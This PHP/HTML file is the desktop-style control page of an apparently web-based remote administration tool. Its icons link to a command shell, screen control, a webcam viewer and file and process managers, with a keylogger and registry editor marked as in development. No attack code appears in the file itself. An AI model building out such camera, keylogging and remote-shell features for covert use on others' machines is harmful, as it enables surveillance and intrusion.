<?php
session_start();
//if (isset($_COOKIE["user_name"])||$_COOKIE["user_name"]!="")
if(isset($_SESSION["user_name"])&&isset($_SESSION["user_id"]))
{
	
}
else
{
	echo "<script language='javascript'>";
	echo "location='../index.php';";
	echo "</script>";
}
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title> <?php echo $_SESSION["user_name"];?> -Virtual Desktop</title>
<script type="text/javascript" src="../assets/js/jquery-1.6.4.js"></script>
<script type="text/javascript" src="../assets/js/myLib.js"></script>
<script type="text/javascript">
$(function(){
		   myLib.progressBar();
		   });
$.include(['../assets/css/desktop.css', '../assets/css/jquery-ui-1.8.18.custom.css', '../assets/css/smartMenu.css' , '../assets/js/jquery-ui-1.8.18.custom.min.js', '../assets/js/jquery.winResize.js', '../assets/js/jquery-smartMenu-min.js', '../assets/js/desktop.js']);
$(window).load(function(){
		   myLib.stopProgress();
		  var deskIconData={
						'Document':{
					   'title':'文件管理-开发中-数据无价，谨慎操作-文件上右击进行选中',
					   'url':'FileManager.php',
					   'winWidth':960,
					   'winHeight':628
						},
						'Clipboard':{
					   'title':'剪帖板操作-开发中',
					   'url':'developing.htm',
					   'winWidth':465,
					   'winHeight':430
						},
						'Tasks':{
					   'title':'进程管理-开发中',
					   'url':'TaskManager.php',
					   'winWidth':810,
					   'winHeight':605
						},
						'Server':{
					   'title':'服务管理-开发中',
					   'url':'developing.htm',
					   'winWidth':465,
					   'winHeight':430
						},
						'Register':{
					   'title':'注册表编辑-开发中',
					   'url':'developing.htm',
					   'winWidth':465,
					   'winHeight':430
						},
						'Message':{
					   'title':'聊天消息-开发中',
					   'url':'developing.htm',
					   'winWidth':465,
					   'winHeight':430
						},
						'Home':{
					   'title':'退出系统-开发中',
					   'url':'developing.htm',
					   'winWidth':465,
					   'winHeight':430
						},
						'Keyboard':{
					   'title':'键盘记录-开发中',
					   'url':'developing.htm',
					   'winWidth':465,
					   'winHeight':430
						},
						'Command':{
					   'title':'命令行',
					   'url':'CommandShell.php',
					   'winWidth':800,
					   'winHeight':510
						},
						'Desktopviewer':{
					   'title':'屏幕控制',
					   'url':'ScreenViewer.php',
					   'winWidth':930,
					   'winHeight':590
						},
						'CameraViewer':{
					   'title':'摄像头',
					   'url':'CameraViewer.php',
					   'winWidth':450,
					   'winHeight':400
						},
						'Exit':{
					   'title':'退出系统',
					   'url':'http://pixlr.com/editor/?loc=zh-cn',
					   'winWidth':942,
					   'winHeight':547
						}
					
			  };			   
		   myLib.desktop.desktopPanel();
		   myLib.desktop.wallpaper.init("../../assets/img/bg_center.jpg");
		   myLib.desktop.taskBar.init();
		   myLib.desktop.deskIcon.init(deskIconData);
	//	   myLib.desktop.navBar.init();
		  });		

</script>
</head>
<body>
	<div id="wallpapers"></div>
	<!--<div id="navBar"><a href="#" class="currTab" title="桌面1"></a></div>-->
	<div id="taskBarWrap">
		<div id="taskBar">
		  <div id="leftBtn"><a href="#" class="upBtn"></a></div>
		  <div id="rightBtn"><a href="#" class="downBtn"></a> </div>
		  <div id="task_lb_wrap"><div id="task_lb"></div></div>
		</div>
	</div>
	<div id="desktopPanel">
		<div id="desktopInnerPanel">
			<ul class="deskIcon currDesktop">
				<li class="desktop_icon" id="Command"> <span class="icon"><img src="../assets/img/icons/cmd.png"/></span> <div class="text">命令行<s></s></div> </li>
				<li class="desktop_icon" id="Desktopviewer"> <span class="icon"><img src="../assets/img/icons/desktop.png"/></span> <div class="text">屏幕控制<s></s></div> </li>
				<li class="desktop_icon" id="CameraViewer"> <span class="icon"><img src="../assets/img/icons/camera.png"/></span> <div class="text">摄像头<s></s></div> </li>
				<li class="desktop_icon" id="Document"> <span class="icon"><img src="../assets/img/icons/document.png"/></span> <div class="text">文件管理<s></s></div> </li>
				<li class="desktop_icon" id="Tasks"> <span class="icon"><img src="../assets/img/icons/tasks.png"/></span> <div class="text">进程管理<s></s></div> </li>
				<li class="desktop_icon" id="Server"> <span class="icon"><img src="../assets/img/icons/server.png"/></span> <div class="text">服务管理<s></s></div> </li>
				<li class="desktop_icon" id="Register"> <span class="icon"><img src="../assets/img/icons/register.png"/></span> <div class="text">注册表编辑<s></s></div> </li>
				<li class="desktop_icon" id="Keyboard"> <span class="icon"><img src="../assets/img/icons/keyboard.png"/></span> <div class="text">键盘记录<s></s></div> </li>
				<li class="desktop_icon" id="Message"> <span class="icon"><img src="../assets/img/icons/message.png"/></span> <div class="text">聊天消息<s></s></div> </li>
				<li class="desktop_icon" id="Clipboard"> <span class="icon"><img src="../assets/img/icons/clipboard.png"/></span> <div class="text">剪贴板操作<s></s></div> </li>
				<li class="desktop_icon" id="Home"> <span class="icon"><img src="../assets/img/icons/home.png"/></span> <div class="text">退出系统<s></s></div> </li>
			</ul>
		</div>
	</div>
	</div>
</body>
</html>
